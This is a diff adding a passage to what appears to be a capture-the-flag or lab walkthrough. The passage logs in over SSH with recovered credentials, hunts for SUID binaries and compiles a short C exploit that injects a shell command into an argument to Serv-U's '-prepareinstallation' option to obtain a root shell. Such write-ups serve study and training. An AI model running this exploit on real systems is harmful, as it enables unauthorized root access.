@@ -211,15 +211,110 @@ Gobuster will test each directory name with these extensions:
 .php → PHP scripts
 .sh → Shell scripts
 ```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/cbc1e9a3-a68a-4260-a943-f4a782021c17"></picture></h1>
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/9b232f33-ec69-4551-844a-23aeaaaa8a05"></picture></h1>
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/dc357a3c-bc5d-4f88-8ee3-4cf663e7c70e"></picture></h1>
 
+#### **User : love**
+#### **Passwd : P@$$w0rd@123**
 
+#### **we now have credentials to try to connect via SSH**
 
+<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 22</h2>
 
+```bash
+ssh love@192.168.1.208
+```
+```
+ssh
+Runs the SSH (Secure Shell) client to connect to a remote machine.
 
+love@192.168.1.208
+love → The username you’re trying to log in as.
+192.168.1.208 → The IP address of the target machine.
+```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/14d0d91f-895e-4fb6-9d60-03506671eac1"></picture></h1>
 
+#### **researching inside the machine**
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/cf876fbf-360f-4cd6-bc3f-11b9b169f331"></picture></h1>
 
+#### **Elevating Privileges**
+```bash
+find / -perm -4000 2>/dev/null | grep -v snap
+```
+```
+find /
+Starts a recursive search from the root directory (/).
+This means it will search the entire filesystem.
 
+-perm -4000
+Searches for files with the SUID (Set User ID) bit set (4000).
+SUID allows a file to be executed with the permissions of the file's owner (often root).
+These files can be privilege escalation vectors.
 
+2>/dev/null
+Redirects error messages (stderr) to /dev/null (hides permission denied errors).
+This prevents cluttering the output with errors from restricted directories.
+
+| grep -v snap
+Filters out (-v) any results containing snap.
+Snap-related binaries are usually not interesting for privilege escalation.
+```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/14329d27-0004-49f3-a000-ca8165acb5ad"></picture></h1>
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/a065228e-3dc6-4b00-a7ac-6afc9087a359"></picture></h1>
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/870de7f0-c854-4c92-a182-6cc14bbb5812"></picture></h1>
+
+#### **the utility uses to compile GCC we check if the machine has it installed**
+```bash
+which gcc
+```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/7f2be5cf-7a65-4349-8a73-54bb1ccd24c6"></picture></h1>
+
+#### **we create a .c file where we will put the code we found and then compile it.**
+```bash
+nano xploit.c
+```
+
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/372c63dc-aa7c-4df6-8ff5-5f9b4efa05c2"></picture></h1>
+
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main()
+{       
+    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
+    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
+    // if execv is successful, we won't reach here
+    printf("ret val: %d errno: %d\n", ret_val, errno);
+    return errno;
+}
+```
+
+```bash
+gcc xploit.c -o exploit
+```
+```
+gcc
+GNU Compiler Collection (GCC), a compiler used to compile C programs into executable binaries.
+In this case, you're compiling a C source file.
+
+xploit.c
+The C source file containing the code to be compiled.
+The file likely contains an exploit or some form of malicious code (based on the name "xploit").
+
+-o exploit
+The -o flag specifies the output file name.
+The compiled program will be named exploit (instead of the default a.out).
+```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/cc1df999-c2d2-4671-8cd3-1f41dc72ec1d"></picture></h1>
+
+```bash
+./exploit
+```
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/d3911bc4-2b97-4d67-bb4b-cd75ded133c5"></picture></h1>
+<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/d1b7f4ef-974c-4a15-b2ac-3a78b6483142"></picture></h1>
 
 
 
